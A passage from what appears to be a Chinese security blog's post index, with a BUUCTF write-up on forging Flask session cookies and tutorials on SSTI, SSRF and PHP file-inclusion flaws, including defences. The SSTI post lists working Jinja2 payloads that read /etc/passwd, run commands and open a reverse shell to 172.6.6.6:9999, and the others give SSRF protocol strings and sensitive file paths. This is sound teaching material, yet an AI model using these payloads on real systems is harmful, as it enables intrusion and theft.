#Post处理    username = request.form.get(&quot;username&quot;)    password = request.form.get(&quot;password&quot;)    #验证登录信息    if username == &#x27;zx&#x27; and password==&quot;123&quot;:        print(&quot;登录成功&quot;)        #将我们的状态数据保存到session        session[&quot;username&quot;] = username        #设置session是否持久化（） 默认为false（会话结束自动删除）        session.permanent = True        # #删除字典数据        # session.pop(&quot;username&quot;)        return redirect(url_for(&quot;index&quot;))    else:        return &#x27;登录失败&#x27;if __name__ == &#x27;__main__&#x27;:    app.run()\n\n\n\n解题：\n登陆页面 发现有两个功能 登陆和注册 分别检测 两个功能。 登陆功能没有什么点可以用，只能注册，注册一个test用户登陆看看！\n\n发现有四个功能，返回主页面，提交留言，修改密码，登出\n\n在查看一手源代码，看来在提示要admin登陆了。\n\n修改密码页面存在提示，github上面应该是他的源码，去嫖一手。\n\n这里用到了session，因此可以想到篡改session实现admin登陆\n\n得到 test账号的session 尝试解密\n\n根据脚本得到解密串:\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n将text改为admin可得\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n根据flask session的特性 我们还必须找到 加密所需的密钥\n\n在 config.py中找到密钥\n\n在得到加密之后的字符串，将其为session赋值即可admin登陆。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"浅析SSTI漏洞","url":"http://example.com/2021/01/26/浅析SSTI漏洞/","content":"python-flask-ssti(模版注入漏洞)原理：SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。\n模板注入和SQL注入很像，都是用户输入被当做代码执行（因此，“用户的输入都是不可信的”）这句话整的很实用。\n前置知识：1.运行一个一个最小的 Flask 应用from flask import Flaskapp = Flask(__name__)&quot;&quot;&quot;第一部分，初始化：所有的Flask都必须创建程序实例，web服务器使用wsgi协议，把客户端所有的请求都转发给这个程序实例程序实例是Flask的对象，一般情况下用如下方法实例化Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名`&quot;&quot;&quot;`@app.route(&#x27;/&#x27;)def hello_world():    return __name__#  第二部分，路由和视图函数：#  客户端发送url给web服务器，web服务器将url转发给flask程序实例，程序实例#  需要知道对于每一个url请求启动那一部分代码，所以保存了一个url和python函数的映射关系。#  处理url和函数之间关系的程序，称为路由#  在flask中，定义路由最简便的方式，是使用程序实例的app.route装饰器，把装饰的函数注册为路由 if __name__ == &#x27;__main__&#x27;:    print(&#x27;dd&#x27;,__name__)    app.run()#  第三部分：程序实例用run方法启动flask集成的开发web服务器#  __name__ == &#x27;__main__&#x27;是python常用的方法，表示只有直接启动本脚本时候，才用app.run方法#  如果是其他脚本调用本脚本，程序假定父级脚本会启用不同的服务器，因此不用执行app.run()#  服务器启动后，会启动轮询，等待并处理请求。轮询会一直请求，直到程序停止。\n\n如上述代码所示，app是flask的实例，功能就是接受来自web服务器的请求，\n\n\n浏览器将请求给web服务器，web服务器将请求给app ,\n\napp收到请求，通过路由找到对应的视图函数，然后将请求处理，得到一个响应response\n\n然后app将响应返回给web服务器，\n\nweb服务器返回给浏览器，\n\n浏览器展示给用户观看，流程完毕。\n2.jinja2jnja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。\n\n​        jinja2 存在着三种特殊的语句：\n\n&#123;%   %&#125;：控制结构。\n\n&#123;&#123;   &#125;&#125;：变量取值。被两个括号包裹的内容会输出其表达式的值\n\n&#123;#     #&#125;：注释。\njinja2模板中使用&#123;&#123;   &#125;&#125;语法表示一个变量，他是一种特殊的占位符。当利用jinja2进行渲染时，他会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的python数据类型。\njinja2中的过滤器：\n变量名后面加一根竖线，再跟上过滤器的名字就能使用特定的过滤器修改变量了。\n\n\n\nsafe 过滤器值得特别说明一下。默认情况下，出于安全考虑， Jinja2 会转义所有变量。很多情况下需要显示变量中存储的 HTML 代码，这时就可使用 safe 过滤器。\ninja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。\n3.python魔法函数​    Python内置的以双下划线开头并以双下划线结尾的函数（不能自己定义，没有用），如_等很多，用于实现并定制很多特性，非常灵活，且是隐式调用的。　\n​    魔法函数会直接影响到Python语法本身，如让类变成可迭代的对象，也会影响Python的一些内置函数的调用，如实现len()能对对象调用len()方法。\n常用的魔法函数：https://www.cnblogs.com/small-office/p/9337297.html\n4.python中的object​    在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法\nPython中一些常见的特殊方法：\n__class__返回调用的参数类型。__base__返回基类__mro__允许我们在当前Python环境下追溯继承树__subclasses__()返回子类\n\n　\n\n\n   ​    \nssti漏洞检测   检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：\n   \n漏洞利用1.payload原理​    ·Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数。加上python中的魔术方法，object类中的基本方法。结合这几个 我们可以 实现任意代码的执行。\n2.payload具体思路\n现在我们的思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[&#x27;builtins&#x27;]即可调用eval等执行任意代码。\n\nbuiltins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块\n &#x27;&#x27;.__class__.__base__.__subclasses__()# 返回子类的列表 [,,,...]#从中随便选一个类,查看它的__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性#再换几个子类，很快就能找到一个重载过__init__的类，比如 &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]#然后用eval执行命令即可\n\n常用的payloadpython2：​    文件的写入和读取\n#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;#写文件&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/1&#x27;).write(&quot;&quot;) &#125;&#125;\n\n​    任意执行\n​    每次执行都要先写然后编译执行\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;code&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  \n\n​    写入一次\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  &#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/usr/bin/id&#x27;,shell=True) &#125;&#125;    \n\n​    不回显的\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;1+1&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125;\n\n​    任意执行只需要一条指令\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;(system函数换为popen(&#x27;&#x27;).read()，需要导入os模块)  &#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)\n\n​    总结\n通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。\n\npython3​        因为python3没有file了，所以用的是open\n​        文件读取\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;\n\n​        任意执行\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;\n\n​        命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n​        \nWAF绕过python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#x27;os.system(&quot;ls&quot;)&#x27;)().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;)python3：&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)\n\n例题演示题目：攻防世界之Web_python_template_injection\n连接：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1\n\n打开题目提示存在 python 的模板注入\n\n传参之后页面报错 但是输入的参数 a和x 已经被成功输入。\n.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块\n\n3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个\n4.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中\n\n5.使用[&#39;o&#39;+&#39;s&#39;],可绕过对os字符的过滤，访问http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D查看flag文件所在\n\n6.访问\n","categories":["漏洞总结"],"tags":["SSTI"]},{"title":"浅析SSRF漏洞","url":"http://example.com/2021/01/26/浅析SSRF/","content":"SSRF(Server-side Request Forge, 服务端请求伪造)什么是 SSRF他是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 形成的原因​    大多数SSRF产生的原因是服务端提供了从其他服务器获取数据的功能,并且没有对目的地址做过滤和限制.比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载\n代码案例\n//curl造成的SSRFfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url);  //file_get_contents造成的SSRF$url = $_GET[&#x27;url&#x27;];echo file_get_contents($url);//fsockopen造成的SSRF&lt;?phpfunction Getfile($host, $port, $link)&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);    if(!$fp)&#123;        echo &quot;$errstr (error number $errno) \\n&quot;;    &#125;else&#123;        $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;        $out .= &quot;HOST $host \\r\\n&quot;;        $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;        $out .= &quot;\\r\\n&quot;;        fwrite($fp, $out);        $content = &#x27;&#x27;;        while(!feof($fp))&#123;            $contents .= fgets($fp, 1024);        &#125;        fclose($fp);        return $contents;    &#125;&#125;\n\n\n\nSSRF攻击流程假定 A 为一个公司的主站,所有人都可以访问, B 是该公司内部的一个网站,只有公司能为能够访问,且与 A 能够相互访问。\n正常用户：\n输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求，并处理 –&gt;返回用户响应\n此时如果A服务器接受请求是没有经过严格的过滤，导致A能够在B上获取数据，就会产生SSRF\n例如:\n正常用户输入的URL:http://www.123.com/index.php?img=www.aaa.com/1.jpg\n攻击者将www.aaa.com换成B的内网地址,如果存在就返回1XX | 2XX的状态码,不存在就会出现其他的状态码\n因此,SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。\nSSRF可能出现的地方(核心就是调用外部资源的所有参数都有可能)\n社交分享功能：获取超链接的标题等内容进行显示\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译：给网址翻译对应网页的内容\n\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n邮件系统：比如接收邮件服务器地址\n\n编码处理, 属性信息处理，文件处理：比如fpmg，ImageMagick，docx，pdf，xml处理器等\n\n从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n将url换成我们的DNS服务器，通过查看DNFlog平台日志看是否有服务器ip判断是否有SSRF漏洞\n\n\nSSRF的危害\n让服务端去访问相应的网址\n\n让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms\n\n可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件\n\n攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包payload）\n\n判断内网主机是否存活：方法是访问看是否有端口开放\n\nDoS攻击（请求大文件，始终保持连接keep-alive always）\n\n\nSSRF漏洞利用\ndict协议,操作redis服务,例如:dict://127.0.0.1:6379/info\n\nfile协议,任意文件读取,例如:file:///etc/passwd\n\ngopher,反弹shell,例如gopher://127.0.0.1:6379/xxxxxxx\n\nhttp,结合burpsuite探测内网存活主机\n\n\nSSRF利用小技巧\nhttp://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的\n\n各种IP地址的进制转换\n\nURL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/\n\n短网址绕过 http://t.cn/RwbLKDx\n\nxip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意,利用重定向）\n\n限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80\n\n例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，但这样可以用 http://abc@10.153.138.81/ 绕过\n\n\nSSRF如何防护\n黑名单\n过滤10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址\n过滤file:///、dict://、gopher://、ftp:// 危险协议\n对返回的内容进行识别\n\n\n白名单\n使用地址白名单\n对返回内容进行识别\n需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用 CURLOPT_FOLLOWLOCATION；然后通过域名获取目标ip，并过滤内部ip；最后识别返回的内容是否与假定内容一致\n\n\n\n","categories":["漏洞总结"],"tags":["SSRF"]},{"title":"浅析文件包含漏洞","url":"http://example.com/2021/01/26/浅析文件包含漏洞/","content":"文件包含漏洞什么是文件包含​        程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。\n​        简单来说就是为了增加代码的复用性,将重复使用的代码写入一个文件后,通过文件包含函数,在一个文件中包含另一个文件。\n文件包含漏洞形成的原因。​        随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码，就造成了文件包含漏洞。\n示例：\n​            \n&lt;?php    $filename  = $_GET[&#x27;filename&#x27;];    include($filename);?&gt;\n\n$_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改\n$_GET[&#39;filename&#39;]的值，执行非预期的操作。\n文件包含漏洞所使用的函数\ninclude( )当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。\n\ninclude_once( )功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次\n\nrequire( )require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。\n\nrequire_once( )功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n\n当出现上述四个函数是,就可能出现文件包含漏洞\n文件包含漏洞的危害\n读取本地文件,获取主机上的敏感信息。例如：配置文件，日志，密码\n\n常见的敏感信息路径：\nWindows系统\n\nc:\\boot.ini // 查看系统版本\nc:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件\nc:\\windows\\repair\\sam // 存储Windows系统初次安装的密码\nc:\\ProgramFiles\\mysql\\my.ini // MySQL配置\nc:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码\nc:\\windows\\php.ini // php 配置信息\n\nLinux/Unix系统\n\n/etc/passwd // 账户信息\n/etc/shadow // 账户密码文件\n/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置\n/usr/local/app/php5/lib/php.ini // PHP相关配置\n/etc/httpd/conf/httpd.conf // Apache配置文件\n/etc/my.conf // mysql 配置文件\n\n\n\n\n远程文件包含：攻击者访问玩不地址来加载远程的代码，需要php.ini中allow_url_fopen和allow_url_include要为On。而且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是php)\n\n可以包含木马文件进行getshell\n\n\n\n文件包含漏洞的利用\n读取本地文件\n\n \n\n\n  在同级目录下创建index.php和flag.php两个文件\n  \n\n可以读取flag.php文件里面的内容\n\n远程文件包含:包含远程文件地址中的木马,使用蚁剑等工具进行连接\n\n文件包含漏洞的小技巧\n大小写绕过\n文件后加入特殊字符绕过利用工具，将访问路径后加入%00，可以绕过后缀检查。或者后面加一些特殊字符例如 斜杠 点之类。\n省略后缀有些程序会将传入参数指引到其他位置，或者修改后缀名，先访问文件判断，例如不需要写后缀名。\n双写绕过当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php”，”…/“，只需再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。\nnginx目录解析漏洞当判断到中间件是nginx时，我们可以利用nginx目录解析，当我们只能上传.jpg文件时，我们无法利用，只能原文读取出来，但是发现在shell.jpg后加/xxx.php,他就能以php方式读取文件，这就是目录解析漏洞。\n包含日志文件\n伪协议包含当不能直接访问目录下文件时，可以选择利用伪协议来访问文件，伪协议有以下几种：（allow_url_fopen和allow_url_include）都为On（1）page=file://[绝对路径]当页面有file1，file2……后台会判断是否已file开头，我们可以使用此协议。（2）php:// 访问各个输入/输出流（I/O streams）php://filter用于读取源码php://input用于执行php代码，或者直接将代码写入执行。（3）zip://[绝对路径], bzip2://[绝对路径], zlib://[绝对路径]协议，都属于压缩楼，访问压缩文件中的子文件，不需要指定后缀phar:// 可以查找指定压缩包内的文件，相对路径与绝对路径都可以写（4）data: text/plain,与input类似，当我们想查看源代码时，可以将其先转换为base64文件在传到页面上就不会执行PHP了（5）http协议也可以传入外部链接，自己服务器的钓鱼网站。\n\n文件包含漏洞如何防护\n\n\n设置白名单\n代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。\n\n\n\n过滤危险字符\n由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。\n\n\n设置文件目录\nPHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。\n\n\n关闭危险配置\nPHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。\n\n\n","categories":["漏洞总结"],"tags":["文件包含"]}]